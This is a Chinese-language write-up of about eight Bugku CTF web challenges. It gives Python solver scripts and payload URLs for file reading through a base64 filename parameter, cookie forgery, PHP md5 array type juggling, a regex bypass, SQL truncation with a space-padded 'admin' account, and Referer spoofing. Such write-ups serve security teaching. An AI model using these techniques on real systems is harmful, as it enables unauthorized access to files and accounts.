web部分的20+题。welcome to bugkuctf这道题打开404

# 秋名山老司机

亲请在2s内计算老司机的车速是多少

702165421+1154429138+1042541861*338334935-739834476-1652744732-1887097714-244715547*1461030294-401250319-977461116=?;

Give me value post about 1531922609+1823637330*1021219038*24080258-1453837304+724139088+460522784-596962562-1691520371*1512685444-1749655109=?

上面的提示给出是用POST请求，发送value值，两秒内肯定自己算不出来，写一个python脚本如下

```python
import requests
import re  # 这个库一般用来匹配文字

url = 'http://123.206.87.240:8002/qiumingshan/'  # url
r = requests.session()  # requests.sesssion()对象可以跨请求的保存某些参数
g = r.get(url)  # 产生一个请求资源的对象，get方法
# 使用re库中的findall方法，匹配正则。第一个参数是要匹配的正则表达式，第二个参数是将我们请求到的资源变成字符串的形式，再以列表的形式返回到变量ans中
ans = re.findall('<div>(.*?)=?;</div>', g.text)
ans = "".join(ans)  # 将ans从列表的形式转化为字符串的形式
ans = ans[:-2]  # 去掉ans最后的两个字符，这里即去掉 =？
print(ans)  # 测试打印一下
post = eval(ans)  # 执行我们处理完的字符串，即那个变态的表达式
data = {'value': post}  # 构造data的post部分
flag = r.post(url, data=data)  # 生成post请求，post的值是算出来的结果
print(flag) # 测试打印返回的结果
print(flag.text)  # 打印返回的数据即flag值
```

运行这段脚本，即可得到flag

# 速度要快

通过抓包得到了下面的内容

```
HTTP/1.1 200 OK
Server: nginx
Date: Sun, 17 Nov 2019 07:45:55 GMT
Content-Type: text/html;charset=utf-8
Connection: close
Set-Cookie: PHPSESSID=v3p9s5foi1t6b351e05nm86e6pk49js3; path=/; HttpOnly
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
Pragma: no-cache
flag: 6LeR55qE6L+Y5LiN6ZSZ77yM57uZ5L2gZmxhZ+WQpzogTXpNd05URTM=
Content-Length: 89

</br>ææè§ä½ å¾å¿«ç¹!!!<!-- OK ,now you have to post the margin what you find -->
```

将flag那个字段进行base64解码，得到的是**跑的还不错，给你flag吧: MzMwNTE3**，然而这是不对的，然后发现每次抓包flag那个字段都会改变，所以要写脚本。

```python
import requests
import base64
url = "http://123.206.87.240:8002/web6/"
r = requests.session()
headers = r.get(url).headers  # 因为flag在消息头里

mid = base64.b64decode(headers['flag'])
mid = mid.decode()  # 为了下一步用split不报错，b64decode后操作的对象是byte类型的字符串，而split函数要用str类型的

flag = base64.b64decode(mid.split(':')[1])  # 获得flag:后的值
data = {'margin': flag}
print(r.post(url, data).text)  # post方法传上去
```

运行这段脚本，即可得到flag

# cookies欺骗

这是题目给出的url：`http://123.206.87.240:8002/web11/index.php?line=&filename=a2V5cy50eHQ=`，将`a2V5cy50eHQ=` 进行 base64 解码得到 keys.txt

尝试用 filename访问 index.php（原url使用base64，这也将 index.php 进行编码，得到 aW5kZXgucGhw），line参数应该是行数，试一下 line=2

即访问 http://123.206.87.240:8002/web11/index.php?line=2&filename=aW5kZXgucGhw，得到了这一串代码`$file=base64_decode(isset($_GET['filename'])?$_GET['filename']:"");`

用脚本将index.php的源码读取出来

```python
import requests
a = 30
for i in range(a):
  url="http://123.206.87.240:8002/web11/index.php?line="+str(i)+"&filename=aW5kZXgucGhw"
  s = requests.get(url)
  print(s.text)
```

运行上面的代码，可以得到php代码

分析php代码，前面判断传参，后面判断cookie必须满足margin=margin才能访问keys.php

编写python脚本

```python
import requests
flag=20
cookies={"margin":"margin"}
for i in range(flag):
  url="http://123.206.87.240:8002/web11/index.php?line="+str(i)+"&filename=a2V5cy5waHA="
  s=requests.get(url,cookies=cookies)
  print(s.text)
```

运行得到flag

# never give up

网页中只有这么一段：never never never give up !!!，打开题目网页查看源码发现有个 1p.html

```html
<!--1p.html-->
never never never give up !!!
```

进行访问：http://123.206.87.240:8006/test/1p.html 发现进入了bugku的论坛，感觉没什么用

就访问 `view-source:http://123.206.87.240:8006/test/1p.html`，查看一下源码，发现一大段JavaScript代码

```javascript
var Words ="..." 
function OutWord()
{
var NewWords;
NewWords = unescape(Words);
document.write(NewWords);
} 
OutWord();
```

把`document.write` 换成 `console.log`，可以得到（也可以直接使用urlDecode进行解密）

```
<script>window.location.href='http://www.bugku.com';</script> 
<!-- 一段base64编码 -->
```

发现有一层base64，将其解密得到又是一层 url，使用urlDecode继续进行解密，终于发现一段php代码。

阅读源码，直接访问 http://123.206.87.240:8006/test/f4l2a3g.txt 即可得到flag

# 字符？正则？

打开题目页面，有一段下面的代码，是考察正则表达式的。

```php
<?php 
highlight_file('2.php');
$key='KEY{********************************}';
$IM= preg_match("/key.*key.{4,7}key:\/.\/(.*key)[a-z][[:punct:]]/i", trim($_GET["id"]), $match);
if( $IM ){ 
  die('key is: '.$key);
}
?>
```

构造 `http://123.206.87.240:8002/web10/?id=keyykeyyyyykey:///1keya.`，即可得到flag

# 前女友(SKCTF)

打开链接发现下面的代码，md5加密比较get方法的v1，v2和v3

```php
<?php
if(isset($_GET['v1']) && isset($_GET['v2']) && isset($_GET['v3'])){
    $v1 = $_GET['v1'];
    $v2 = $_GET['v2'];
    $v3 = $_GET['v3'];
    if($v1 != $v2 && md5($v1) == md5($v2)){
        if(!strcmp($v3, $flag)){
            echo $flag;
        }
    }
}
?>
```

`http://123.206.31.85:49162/?v1[]=1&&v2[]=2&&v3[]=3`，构造出 `?v1[]=1&&v2[]=2&&v3[]=3`，得到flag

# login1(SKCTF)

> 参考：https://blog.csdn.net/qq_42777804/article/details/81866940https://blog.csdn.net/qq_42777804/article/details/81866940

提示我们用 hint:SQL约束攻击

我们需要做的就是注册一个在数据库中会被认为是admin的账户，然后使用这个admin账户登录。

注册用户名为

admin                  （注册的admin后面有18个空格）

密码随便写一个，但要符合要求

注册成功之后用这个注册的登陆就拿到了flag

# 你从哪里来

打开题目网站提示我们：are you from google?

那么我们修改http referer头即可，使用 burpsuite 抓包，请求头添加上 `Referer:https://www.google.com`

